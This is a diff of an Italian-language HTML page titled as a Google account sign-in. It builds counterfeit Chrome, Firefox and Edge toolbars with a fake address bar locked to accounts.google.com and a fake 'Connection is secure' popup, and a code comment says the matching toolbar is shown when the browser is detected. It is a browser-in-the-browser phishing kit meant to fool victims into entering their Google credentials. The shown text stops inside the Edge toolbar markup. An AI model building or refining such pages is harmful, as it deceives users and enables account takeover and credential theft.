@@ -6,7 +6,7 @@
     <title>Accedi - Account Google</title>
     <style>
         /* ==========================================================================
-           RESET E BASE
+           RESET GLOBALE E CONFIGURAZIONE BASE
            ========================================================================== */
         * {
             margin: 0;
@@ -14,43 +14,35 @@
             box-sizing: border-box;
         }
 
+        html {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #000; /* Sfondo nero prima del click */
+            background-color: #f0f4f9;
             height: 100vh;
             width: 100vw;
             display: flex;
             flex-direction: column;
             overflow: hidden;
-            cursor: pointer; /* Indica che si deve cliccare */
+            position: relative;
         }
 
-        #start-screen {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #555;
-            z-index: 9999;
-            background: #fff;
+        /* Nascondi tutte le UI dei browser di default */
+        .browser-ui {
+            display: none;
         }
 
-        #main-wrapper {
-            display: none; /* Nascosto finché non si va in fullscreen */
-            width: 100%;
-            height: 100%;
-            flex-direction: column;
+        /* Icone SVG */
+        svg {
+            fill: currentColor;
         }
-
-        /* Nascondi tutte le barre di default */
-        .browser-ui { display: none; }
-
-        /* Icone base */
-        svg { fill: currentColor; }
 
         /* ==========================================================================
-           1. STILE BARRA CHROME (Material You)
+           BARRA DI NAVIGAZIONE CHROME (Material You Design 2024)
            ========================================================================== */
         #chrome-bar {
             height: 48px;
@@ -60,366 +52,1121 @@
             align-items: center;
             padding: 0 8px;
             gap: 4px;
+            width: 100%;
+            position: relative;
+            z-index: 10;
         }
 
+        /* Pulsanti di navigazione Chrome */
         .cr-btn {
-            width: 34px; height: 34px;
-            border-radius: 50%; border: none;
-            background: transparent; color: #444746;
-            cursor: pointer; display: flex; align-items: center; justify-content: center;
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            border: none;
+            background: transparent;
+            color: #444746;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.15s ease;
         }
-        .cr-btn:hover { background-color: rgba(0, 0, 0, 0.08); }
 
+        .cr-btn:hover {
+            background-color: rgba(0, 0, 0, 0.08);
+        }
+
+        .cr-btn:active {
+            background-color: rgba(0, 0, 0, 0.12);
+        }
+
+        /* Icona freccia indietro disabilitata (grigia) */
+        .cr-btn.disabled {
+            color: #c7c7c7;
+            pointer-events: none;
+        }
+
+        /* Omnibox (Barra degli indirizzi Chrome) */
         .cr-omnibox {
-            flex: 1; height: 34px;
+            flex: 1;
+            height: 34px;
             background-color: #e9eef6;
-            border-radius: 999px; /* Forma a pillola Chrome */
+            border-radius: 999px;
             padding: 0 6px 0 2px;
-            display: flex; align-items: center;
-            margin: 0 4px; border: 1px solid transparent;
+            display: flex;
+            align-items: center;
+            margin: 0 4px;
+            border: 1px solid transparent;
+            transition: background-color 0.2s ease, box-shadow 0.2s ease;
         }
-        .cr-omnibox:hover { background-color: #dfe3eb; }
+
+        .cr-omnibox:hover {
+            background-color: #dfe3eb;
+        }
+
         .cr-omnibox.focused {
-            background-color: #ffffff; border-color: #0b57d0; box-shadow: 0 0 0 1px #0b57d0;
+            background-color: #ffffff;
+            border-color: #0b57d0;
+            box-shadow: 0 0 0 1px #0b57d0;
         }
 
+        /* Pulsante informazioni sito (icona -o o-) */
         .cr-site-info {
-            height: 28px; border-radius: 14px; padding: 0 8px;
-            background: transparent; border: none; cursor: pointer;
-            display: flex; align-items: center; color: #444746; margin-right: 4px;
+            height: 28px;
+            border-radius: 14px;
+            padding: 0 8px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            color: #444746;
+            margin-right: 4px;
+            transition: background-color 0.15s ease;
         }
-        .cr-site-info:hover { background-color: rgba(0, 0, 0, 0.08); }
 
+        .cr-site-info:hover {
+            background-color: rgba(0, 0, 0, 0.08);
+        }
+
+        .cr-site-info svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Input URL */
         .cr-input {
-            flex: 1; border: none; outline: none; font-size: 14px;
-            color: #1f1f1f; background: transparent; font-family: inherit;
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 14px;
+            color: #1f1f1f;
+            background: transparent;
+            font-family: inherit;
+            padding: 0 4px;
         }
-        .cr-input::selection { background-color: #b3d4ff; }
 
-        /* CHROME POPUP */
-        .cr-popup {
-            position: absolute; top: 40px; left: 100px;
-            background: white; border-radius: 12px; width: 320px;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.12); display: none; z-index: 1000; padding: 12px 0;
+        .cr-input::selection {
+            background-color: #b3d4ff;
         }
-        .cr-popup.active { display: block; }
-        .cr-popup-header { padding: 8px 16px 12px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #f1f3f4; }
-        .cr-popup-row { display: flex; align-items: center; padding: 10px 16px; cursor: pointer; gap: 16px; color: #1f1f1f; font-size: 13px;}
-        .cr-popup-row:hover { background-color: #f8f9fa; }
-        .cr-popup-sub { font-size: 12px; color: #444746; }
+
+        /* Contenitore azioni Omnibox (Traduttore, Stella) */
+        .omnibox-actions {
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .action-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            color: #444746;
+            transition: background-color 0.15s ease;
+        }
+
+        .action-icon:hover {
+            background-color: rgba(0, 0, 0, 0.08);
+        }
+
+        .action-icon svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Popup informazioni sito Chrome */
+        .cr-popup {
+            position: absolute;
+            top: 40px;
+            left: 100px;
+            background: white;
+            border-radius: 12px;
+            width: 320px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12), 0 0 2px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+            padding: 12px 0;
+        }
+
+        .cr-popup.active {
+            display: block;
+        }
+
+        .cr-popup-header {
+            padding: 8px 16px 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #f1f3f4;
+        }
+
+        .cr-popup-header svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .site-domain {
+            font-size: 15px;
+            color: #1f1f1f;
+            font-weight: 500;
+        }
+
+        .cr-popup-row {
+            display: flex;
+            align-items: center;
+            padding: 10px 16px;
+            cursor: pointer;
+            gap: 16px;
+            color: #1f1f1f;
+            font-size: 13px;
+        }
+
+        .cr-popup-row:hover {
+            background-color: #f8f9fa;
+        }
+
+        .cr-popup-row svg {
+            width: 20px;
+            height: 20px;
+            fill: #444746;
+        }
+
+        .site-text {
+            flex: 1;
+        }
+
+        .site-text-sub {
+            font-size: 12px;
+            color: #444746;
+            margin-top: 2px;
+        }
+
+        .arrow-right {
+            color: #444746;
+            font-size: 16px;
+        }
+
+        /* Pulsante profilo Chrome (icona utente circolare) */
+        .cr-profile {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: #e9eef6;
+            margin: 0 4px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.15s ease;
+        }
+
+        .cr-profile:hover {
+            background-color: #dfe3eb;
+        }
+
+        .cr-profile svg {
+            width: 20px;
+            height: 20px;
+            fill: #0b57d0;
+        }
+
+        /* Menu 3 pallini verticali Chrome */
+        .cr-menu-btn {
+            width: 34px;
+            height: 34px;
+        }
 
         /* ==========================================================================
-           2. STILE BARRA FIREFOX (Proton)
+           BARRA DI NAVIGAZIONE FIREFOX (Proton Design)
            ========================================================================== */
         #firefox-bar {
             height: 40px;
             background-color: #f9f9fb;
             border-bottom: 1px solid #cccccc;
-            display: flex; align-items: center; padding: 0 5px; gap: 2px;
+            display: flex;
+            align-items: center;
+            padding: 0 5px;
+            gap: 2px;
+            width: 100%;
+            position: relative;
+            z-index: 10;
         }
 
         .ff-btn {
-            width: 32px; height: 32px;
-            border-radius: 4px; border: none;
-            background: transparent; color: #15141a;
-            cursor: pointer; display: flex; align-items: center; justify-content: center;
+            width: 32px;
+            height: 32px;
+            border-radius: 4px;
+            border: none;
+            background: transparent;
+            color: #15141a;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.15s ease;
         }
-        .ff-btn:hover { background-color: #e0e0e6; }
+
+        .ff-btn:hover {
+            background-color: #e0e0e6;
+        }
+
+        .ff-btn.disabled {
+            color: #a2a2a6;
+            pointer-events: none;
+        }
 
         .ff-urlbar {
-            flex: 1; height: 30px;
+            flex: 1;
+            height: 30px;
             background-color: #ffffff;
-            border-radius: 4px; /* Forma squadrata Firefox */
+            border-radius: 4px;
             border: 1px solid #cfd8dc;
-            padding: 0 4px; display: flex; align-items: center; margin: 0 4px;
+            padding: 0 4px;
+            display: flex;
+            align-items: center;
+            margin: 0 4px;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
         }
-        .ff-urlbar.focused { border-color: #0061e0; box-shadow: 0 0 0 2px rgba(0,97,224,0.3); }
 
-        .ff-shield, .ff-lock {
-            width: 28px; height: 28px; border-radius: 4px;
-            display: flex; align-items: center; justify-content: center;
-            color: #5b5b66; cursor: pointer;
+        .ff-urlbar.focused {
+            border-color: #0061e0;
+            box-shadow: 0 0 0 2px rgba(0, 97, 224, 0.3);
         }
-        .ff-shield:hover, .ff-lock:hover { background-color: #f0f0f4; }
+
+        .ff-shield,
+        .ff-lock {
+            width: 28px;
+            height: 28px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #5b5b66;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+        }
+
+        .ff-shield:hover,
+        .ff-lock:hover {
+            background-color: #f0f0f4;
+        }
+
+        .ff-shield svg,
+        .ff-lock svg {
+            width: 16px;
+            height: 16px;
+        }
 
         .ff-input {
-            flex: 1; border: none; outline: none; font-size: 13.5px;
-            color: #15141a; background: transparent; padding-left: 4px;
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 13.5px;
+            color: #15141a;
+            background: transparent;
+            padding-left: 4px;
+        }
+
+        /* Menu hamburger Firefox */
+        .ff-hamburger {
+            width: 32px;
+            height: 32px;
+        }
+
+        .ff-hamburger svg {
+            width: 18px;
+            height: 18px;
         }
 
         /* ==========================================================================
-           3. STILE BARRA EDGE / GENERIC
+           BARRA DI NAVIGAZIONE EDGE/OPERA/GENERIC
            ========================================================================== */
         #edge-bar {
             height: 44px;
             background-color: #f7f7f7;
             border-bottom: 1px solid #cccccc;
-            display: flex; align-items: center; padding: 0 8px; gap: 4px;
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            gap: 4px;
+            width: 100%;
+            position: relative;
+            z-index: 10;
         }
+
+        .ed-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 4px;
+            border: none;
+            background: transparent;
+            color: #15141a;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.15s ease;
+        }
+
+        .ed-btn:hover {
+            background-color: #e0e0e6;
+        }
+
+        .ed-btn.disabled {
+            color: #a2a2a6;
+            pointer-events: none;
+        }
+
         .ed-omnibox {
-            flex: 1; height: 32px; background: #ffffff; border-radius: 6px;
-            border: 1px solid #999; display: flex; align-items: center; padding: 0 8px;
+            flex: 1;
+            height: 32px;
+            background: #ffffff;
+            border-radius: 6px;
+            border: 1px solid #999;
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            transition: border-color 0.2s ease;
+        }
+
+        .ed-omnibox.focused {
+            border-color: #0078d4;
+            box-shadow: 0 0 0 1px #0078d4;
+        }
+
+        .ed-omnibox svg {
+            width: 14px;
+            height: 14px;
+            color: #666;
+            margin-right: 8px;
+        }
+
+        .ed-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 13px;
+            color: #15141a;
+        }
+
+        /* Menu 3 pallini orizzontali Edge */
+        .ed-menu {
+            width: 32px;
+            height: 32px;
+        }
+
+        .ed-menu svg {
+            width: 16px;
+            height: 16px;
         }
 
         /* ==========================================================================
-           CONTENUTO GOOGLE LOGIN (Comune a tutti i browser)
+           AREA CONTENUTO PRINCIPALE (Login Google)
            ========================================================================== */
         .content {
-            flex: 1; display: flex; justify-content: center; align-items: center;
-            background-color: #f0f4f9; cursor: default;
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f4f9;
+            cursor: default;
+            width: 100%;
+            overflow-y: auto;
         }
 
         .login-container {
-            width: 448px; padding: 40px; border-radius: 28px;
-            text-align: center; background-color: white;
-            border: 1px solid #d3e3fd; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            width: 448px;
+            padding: 40px;
+            border-radius: 28px;
+            text-align: center;
+            background-color: white;
+            border: 1px solid #d3e3fd;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            margin: 20px;
         }
 
-        .header svg { width: 40px; height: 40px; margin-bottom: 16px; }
-        .header h1 { font-size: 24px; font-weight: 400; color: #1f1f1f; margin-bottom: 8px; }
-        .header p { font-size: 16px; color: #444746; margin-bottom: 30px;}
+        /* Header del form con logo Google */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-        .form-group { position: relative; margin-bottom: 20px; }
+        .header svg {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 16px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #1f1f1f;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 16px;
+            color: #444746;
+            margin-bottom: 0;
+        }
+
+        /* Form group con label fluttuante */
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
         .form-control {
-            width: 100%; padding: 16px; border: 1px solid #747775; border-radius: 4px;
-            font-size: 16px; outline: none; background: transparent; color: #1f1f1f;
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            background: transparent;
+            color: #1f1f1f;
+            transition: border-color 0.2s ease, padding 0.2s ease;
         }
-        .form-control:focus { border: 2px solid #0b57d0; padding: 15px; }
+
+        .form-control:focus {
+            border: 2px solid #0b57d0;
+            padding: 15px;
+        }
+
+        /* Label fluttuante animata */
         .class-label {
-            position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
-            background: #ffffff; padding: 0 4px; color: #444746; transition: 0.2s ease all; pointer-events: none; font-size: 16px;
-        }
-        .form-control:focus ~ .class-label, .form-control:not(:placeholder-shown) ~ .class-label {
-            top: 0; font-size: 12px; color: #0b57d0;
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #ffffff;
+            padding: 0 4px;
+            color: #444746;
+            transition: top 0.2s ease, font-size 0.2s ease, color 0.2s ease;
+            pointer-events: none;
+            font-size: 16px;
         }
 
-        .error-message { display: none; color: #b3261e; font-size: 12px; margin-top: 6px; text-align: left; }
-        .form.submitted .form-control:invalid ~ .error-message { display: block; }
-        .form.submitted .form-control:invalid { border-color: #b3261e; }
-        .form.submitted .form-control:invalid ~ .class-label { color: #b3261e; }
+        .form-control:focus ~ .class-label,
+        .form-control:not(:placeholder-shown) ~ .class-label {
+            top: 0;
+            font-size: 12px;
+            color: #0b57d0;
+        }
 
-        .links-action { margin-bottom: 30px; text-align: left; }
-        .forgot-link { color: #0b57d0; text-decoration: none; font-size: 14px; font-weight: 500; }
-        .guest-notice { font-size: 14px; color: #444746; line-height: 1.4; margin-bottom: 35px; text-align: left;}
-        .guest-notice a { color: #0b57d0; text-decoration: none; font-weight: 500; }
-        
-        .bottom-buttons { display: flex; justify-content: space-between; align-items: center; }
-        .create-account { color: #0b57d0; text-decoration: none; font-size: 14px; font-weight: 500; }
-        .form-button { background-color: #0b57d0; color: white; border: none; padding: 10px 24px; border-radius: 100px; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .form-button:hover { background-color: #0842a0; }
+        /* Messaggio di errore */
+        .error-message {
+            display: none;
+            color: #b3261e;
+            font-size: 12px;
+            margin-top: 6px;
+            text-align: left;
+            padding-left: 4px;
+        }
+
+        .form.submitted .form-control:invalid ~ .error-message {
+            display: block;
+        }
+
+        .form.submitted .form-control:invalid {
+            border-color: #b3261e;
+        }
+
+        .form.submitted .form-control:invalid ~ .class-label {
+            color: #b3261e;
+        }
+
+        /* Link "Hai dimenticato l'email?" */
+        .links-action {
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .forgot-link {
+            color: #0b57d0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.15s ease;
+        }
+
+        .forgot-link:hover {
+            color: #0842a0;
+            text-decoration: underline;
+        }
+
+        /* Testo informativo modalità ospite */
+        .guest-notice {
+            font-size: 14px;
+            color: #444746;
+            line-height: 1.4;
+            margin-bottom: 35px;
+            text-align: left;
+        }
+
+        .guest-notice a {
+            color: #0b57d0;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.15s ease;
+        }
+
+        .guest-notice a:hover {
+            color: #0842a0;
+            text-decoration: underline;
+        }
+
+        /* Pulsanti inferiori */
+        .bottom-buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #0b57d0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.15s ease;
+        }
+
+        .create-account:hover {
+            color: #0842a0;
+            text-decoration: underline;
+        }
+
+        .form-button {
+            background-color: #0b57d0;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 100px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+        }
+
+        .form-button:hover {
+            background-color: #0842a0;
+        }
+
+        .form-button:active {
+            background-color: #063399;
+        }
+
+        /* ==========================================================================
+           UTILITIES E HELPERS
+           ========================================================================== */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Evita che l'utente selezioni elementi dell'interfaccia */
+        .browser-ui,
+        .cr-btn,
+        .ff-btn,
+        .ed-btn {
+            user-select: none;
+            -webkit-user-select: none;
+        }
     </style>
 </head>
 <body>
 
-    <div id="start-screen">Clicca ovunque per avviare</div>
+    <!-- ==========================================================================
+         BARRA CHROME (visibile solo se rileva Chrome)
+         ========================================================================== -->
+    <div id="chrome-bar" class="browser-ui">
+        <!-- Freccia indietro (grigia perché non c'è cronologia) -->
+        <button class="cr-btn disabled" title="Indietro">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+            </svg>
+        </button>
 
-    <div id="main-wrapper">
-        
-        <!-- ==================================================================
-             BARRA CHROME
-             ================================================================== -->
-        <div id="chrome-bar" class="browser-ui">
-            <button class="cr-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button>
-            <button class="cr-btn" style="color: #c7c7c7;"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
-            <button class="cr-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></button>
+        <!-- Freccia avanti (grigia perché non c'è cronologia) -->
+        <button class="cr-btn disabled" title="Avanti">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/>
+            </svg>
+        </button>
+
+        <!-- Ricarica pagina -->
+        <button class="cr-btn" onclick="location.reload()" title="Ricarica">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+            </svg>
+        </button>
+
+        <!-- Omnibox (Barra degli indirizzi) -->
+        <div class="cr-omnibox" id="cr-omnibox">
             
-            <div class="cr-omnibox" id="cr-omnibox">
-                <!-- Icona -o o- (Impostazioni sito Chrome) -->
-                <button class="cr-site-info" id="cr-siteBtn">
-                    <svg width="16" height="16" viewBox="0 0 24 24"><path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/></svg>
+            <!-- Icona impostazioni sito "-o o-" -->
+            <button class="cr-site-info" id="cr-siteBtn" title="Visualizza informazioni sul sito">
+                <svg viewBox="0 0 24 24">
+                    <path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/>
+                </svg>
+            </button>
+
+            <!-- Input URL -->
+            <input 
+                type="text" 
+                class="cr-input" 
+                value="https://accounts.google.com/signin" 
+                readonly
+                id="cr-url"
+            >
+
+            <!-- Azioni Omnibox (Traduttore e Stella) -->
+            <div class="omnibox-actions">
+                <!-- Traduttore Google -->
+                <button class="action-icon" title="Traduci questa pagina">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/>
+                    </svg>
                 </button>
 
-                <input type="text" class="cr-input" value="https://accounts.google.com/signin" readonly>
-                
-                <!-- Traduttore e Stella -->
-                <button class="cr-btn" style="width:28px;height:28px;"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg></button>
-                <button class="cr-btn" style="width:28px;height:28px;"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/></svg></button>
-            </div>
-
-            <!-- Estensioni e Profilo Chrome -->
-            <button class="cr-btn"><svg width="18" height="18" viewBox="0 0 24 24"><path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"/></svg></button>
-            
-            <!-- Profilo utente Chrome (Senza testo Work Guest, solo icona utente reale di Chrome) -->
-            <button class="cr-btn" style="background:#e9eef6; margin:0 4px;"><svg width="20" height="20" viewBox="0 0 24 24" fill="#0b57d0"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></button>
-            
-            <!-- Menu 3 pallini Chrome -->
-            <button class="cr-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
-
-            <!-- Popup Chrome (nascosto) -->
-            <div class="cr-popup" id="cr-popup">
-                <div class="cr-popup-header">
-                    <svg width="20" height="20" viewBox="0 0 24 24"><path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/></svg>
-                    <span style="font-size:15px;">google.com</span>
-                </div>
-                <div class="cr-popup-row">
-                    <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm6 10v8H6v-8h12zm-9-2V7c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9z"/></svg>
-                    <div style="flex:1;">Connection is secure</div>
-                    <span style="font-size:16px;">›</span>
-                </div>
-                <div class="cr-popup-row">
-                    <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
-                    <div>Cookies and site data<div class="cr-popup-sub">Manage on device site data</div></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- ==================================================================
-             BARRA FIREFOX
-             ================================================================== -->
-        <div id="firefox-bar" class="browser-ui">
-            <button class="ff-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button>
-            <button class="ff-btn" style="color: #a2a2a6;"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
-            <button class="ff-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></button>
-            
-            <div class="ff-urlbar" id="ff-omnibox">
-                <!-- Scudo Firefox -->
-                <div class="ff-shield">
-                    <svg width="16" height="16" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 19.93V3.13l7 3.11v4.76c0 4.52-2.98 8.69-7 9.93z"/></svg>
-                </div>
-                <!-- Lucchetto Firefox -->
-                <div class="ff-lock">
-                    <svg width="14" height="14" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-                </div>
-                <input type="text" class="ff-input" value="https://accounts.google.com/signin" readonly>
-            </div>
-
-            <button class="ff-btn"><svg width="18" height="18" viewBox="0 0 24 24"><path d="M4 18h16c.55 0 1-.45 1-1s-.45-1-1-1H4c-.55 0-1 .45-1 1s.45 1 1 1zm0-5h16c.55 0 1-.45 1-1s-.45-1-1-1H4c-.55 0-1 .45-1 1s.45 1 1 1zM3 7c0 .55.45 1 1 1h16c.55 0 1-.45 1-1s-.45-1-1-1H4c-.55 0-1 .45-1 1z"/></svg></button>
-        </div>
-
-        <!-- ==================================================================
-             BARRA EDGE/GENERIC
-             ================================================================== -->
-        <div id="edge-bar" class="browser-ui">
-            <button class="ff-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button>
